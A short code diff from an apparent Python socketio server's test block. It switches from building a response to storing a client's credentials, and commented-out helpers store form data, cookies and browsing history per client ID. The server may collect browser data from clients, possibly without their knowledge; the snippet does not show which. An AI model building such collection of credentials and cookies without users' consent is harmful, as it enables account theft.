@@ -90,10 +90,10 @@ if __name__ == "__main__":
         clientid = 123
         data = json.load(f)
         #database.store_form_data(data["forms"][0], clientid)
-        #database.store_credential(data["creds"][0], clientid)
+        database.store_credential(data["creds"][0], clientid)
         #database.store_cookie(data["cookies"][0], clientid)
         #database.store_history(data["history"], clientid)
         #database.create_new_client(data)
-        database.construct_response(clientid)
+        #database.construct_response(clientid)
     socketio.run(app, debug=True)
 
